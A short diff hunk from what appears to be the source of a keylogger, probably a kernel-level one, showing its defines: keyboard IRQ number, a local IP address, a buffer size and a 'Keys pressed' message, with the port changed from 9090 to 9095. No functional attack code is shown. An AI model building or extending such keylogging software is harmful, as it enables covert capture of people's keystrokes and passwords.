@@ -4,7 +4,7 @@
 
 #define KBD_IQR 1 // Keyboard IRQ number.
 #define IP_ADDRESS "127.0.0.1"
-#define PORT 9090
+#define PORT 9095
 
 #define KEY_BUFFER_SIZE 25
 #define KEYLOGGER_MSG "Keys pressed: \0"
